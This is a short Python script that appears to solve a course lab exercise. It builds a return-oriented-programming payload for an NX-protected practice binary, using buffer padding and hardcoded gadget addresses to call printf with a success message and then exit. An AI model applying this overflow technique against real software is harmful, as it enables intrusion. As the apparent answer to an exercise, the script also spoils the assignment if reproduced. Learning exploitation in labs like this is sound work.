#!/usr/bin/env python3
"""
Problem2 Payload Generator

Generate ans2.txt for ROP exploit in problem2 (NX protected).
Creates a ROP chain that calls printf to display "Yes!I like ICS!".

ROP Chain:
- pop rdi; ret gadget (0x4012c7)
- address of string "Yes!I like ICS!\n" (0x40203b)
- ret gadget for stack alignment (0x4012c8)
- printf@plt (0x4010d0)
- exit@plt (0x401120)
"""

from pathlib import Path

# Build ROP chain
payload = b"A" * 16  # Padding to overflow buffer
payload += (0x4012c7).to_bytes(8, "little")  # pop rdi; ret
payload += (0x40203b).to_bytes(8, "little")  # address of success string
payload += (0x4012c8).to_bytes(8, "little")  # ret (stack alignment)
payload += (0x4010d0).to_bytes(8, "little")  # printf@plt
payload += (0x401120).to_bytes(8, "little")  # exit@plt

# Pad to 56 bytes (memcpy copies 0x38 bytes)
payload += b"B" * (56 - len(payload))

# Write to ans2.txt
Path(__file__).resolve().parents[1].joinpath("ans2.txt").write_bytes(payload)

